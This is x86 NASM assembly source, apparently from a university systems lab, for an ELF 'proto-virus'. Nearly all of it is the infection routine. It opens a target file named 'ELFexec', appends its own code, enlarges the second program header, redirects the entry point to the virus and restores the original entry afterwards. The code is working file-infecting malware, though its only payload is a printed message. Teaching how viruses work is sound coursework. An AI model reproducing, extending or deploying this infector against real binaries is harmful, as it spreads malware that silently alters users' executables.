%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%macro get_address 1
	call get_my_loc										
	sub ecx, next_i-%1
%endmacro	

%macro verify_magic_number 2
	cmp byte %1, %2
 	jnz fail_close_exit
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8

%define fd [ebp-4]
%define magic1 [ebp-56]
%define magic2 [ebp-55]
%define magic3 [ebp-54]
%define magic4 [ebp-53]
%define elf_header 56
%define elf_header_size 52
%define program_headers_offset [ebp-elf_header+PHDR_start]
%define entry_point [ebp-elf_header+ENTRY]
%define new_entry_point [ebp-60]
%define exec_file_size [ebp-64]
%define old_entry_point[ebp-68]
%define old_entry_point_offset 68
%define second_program_header 100
%define sec_ph_vir_add [ebp-second_program_header+PHDR_vaddr]
%define sec_ph_offset [ebp-second_program_header+PHDR_offset]
%define sec_ph_file_size [ebp-second_program_header+PHDR_filesize]
%define sec_ph_mem_size [ebp-second_program_header+PHDR_memsize]
%define sec_ph_entry_point [ebp-104]
%define virus_code_size [ebp-108]
	
	global _start

section .text
	_start:	
		push	ebp
		mov	ebp, esp
		sub	esp, STK_RES            							; Set up ebp and reserve space on the stack for local storage

; You code for this lab goes here
		;printing massage
		get_address var
		write 1, ecx, 0x11										;prints to stdout: "This is a virus"

		;open file
		get_address FileName
		mov ebx, ecx
		open ebx, RDWR, 0x700									;opens an ELF file with a given constant name: "ELFexec"
		mov fd, eax												;saves fd
		cmp dword fd, 0
		jl fail_exit											;error with open
		
		;reading elf header
		mov eax, fd
		mov ebx, ebp
		sub ebx, elf_header										;ebx points to the place at the "stack" of the elf header
		read eax, ebx, elf_header_size 							;reads and saves 52 (elf_header_size) first bytes of file

		;verifing magic number
		verify_magic_number magic1, 0x7f
		verify_magic_number magic2, 0x45
		verify_magic_number magic3, 0x4c
		verify_magic_number magic4, 0x46

		;pinting fd to end of exec file and saving exec file size
		mov eax, fd
		lseek eax, 0, SEEK_END 									;fd points to the end of the file
		mov exec_file_size, eax									;saves size of original file

		;writing virus code at the end of the file
		mov eax, (virus_end-_start)
		mov virus_code_size, eax								;saving virus code size for future using
		mov eax, fd	
		mov ebx, virus_code_size
		get_address _start
		write eax, ecx, ebx										;writes the code of virus_end - _start to the end of file

		;reading program header
		mov eax, fd
		mov ebx, program_headers_offset							;ebx hold the offset of the first program header
		add ebx, PHDR_size										;ebx hold the offset of the second program header
		lseek eax, ebx, SEEK_SET								;fd points to the second program header
		mov eax, fd
		mov ebx, ebp
		sub ebx, second_program_header							;ebx points to the place at the "stack" of the second program header
		read eax, ebx, PHDR_size 								;reads and saves 32 (PHDR_size) first bytes of file

		;modifing second program header file size and mem size
		mov eax, exec_file_size								
		add eax, virus_code_size
		sub eax, sec_ph_offset									;eax=exec_file_size+virus_code_size-sec_ph_offset
		mov sec_ph_file_size, eax								;midifies sec_ph_file_size
		mov sec_ph_mem_size, eax								;midifies sec_ph_mem_size

		;re-writing the new second program header after modifing
		mov eax, fd
		mov ebx, program_headers_offset							;ebx hold the offset of the first program header
		add ebx, PHDR_size										;ebx hold the offset of the second program header
		lseek eax, ebx, SEEK_SET								;fd points to the second program header
		mov eax, fd
		mov ebx, ebp
		sub ebx, second_program_header							;ebx points to the place at the "stack" of the second program header
		write eax, ebx, PHDR_size 								;reads and saves 32 (PHDR_size) first bytes of file	

		;saving old_entry_point
		mov eax, entry_point
		mov old_entry_point, eax

		;modifing the entry_point
		mov eax, sec_ph_vir_add					
		add eax, exec_file_size
		sub eax, sec_ph_offset									;eax=sec_ph_vir_add + exec_file_size - sec_ph_offset
		mov entry_point, eax

		;re-writing the new elf_header after modifing
		mov eax, fd
		lseek eax, 0, SEEK_SET 									;fd points to sthe start of the file
		mov eax, fd	
		mov ebx, ebp
		sub ebx, elf_header										;ebx points to the place at the "stack" of the elf header
		write eax, ebx, elf_header_size 						;reads and saves 52 (elf_header_size) first bytes of file

		;pointing fd to the PreviousEntryPoint
		mov eax, fd
		mov ebx, (PreviousEntryPoint-_start)					;ebx hold the offset of 'PreviousEntryPoint' at virus file
    	add ebx, exec_file_size									;ebx holds the offset of 'PreviousEntryPoint' at infected file
		lseek eax, ebx, SEEK_SET								;fd points to 'PreviousEntryPoint'

		;writing old_entry_point at the place of PreviousEntryPoint
		mov eax, fd
		mov ebx, ebp
		sub ebx, old_entry_point_offset							;ebx points to the place at the "stack" of the old_entry_point		
    	write eax, ebx, 4										;instead of jumping to exit, the infected file will jump to old_entry_point

		;closing fd and jump to exit
		mov eax, fd
		close eax												; closes filedescriptor
		get_address PreviousEntryPoint	
		jmp [ecx]	

	fail_exit:
		; get_address Failstr
		; write 2, ecx, 0xD										;prints to stdout: "perhaps not"
		get_address PreviousEntryPoint	
		jmp [ecx]

	fail_close_exit:
		; get_address Failstr
		; write 2, ecx, 0xD										;prints to stdout: "perhaps not"
		mov eax, fd
		close eax												; closes filedescriptor
		get_address PreviousEntryPoint	
		jmp [ecx]

	VirusExit:
    	exit 0            										; Termination if all is OK and no previous code to jump to
                         										; (also an example for use of above macros)
	get_my_loc:
		call next_i												;top of stack = address of 'next_i' at runtime

	next_i:
		pop ecx													;ecx gets address of 'next_i'
		ret

	var:				db "This is a virus", 10 , 0	
	FileName:			db "ELFexec", 0
	OutStr:				db "The lab 9 proto-virus strikes!", 10, 0
	Failstr:        	db "perhaps not", 10 , 0
	
	PreviousEntryPoint: dd VirusExit
	virus_end:


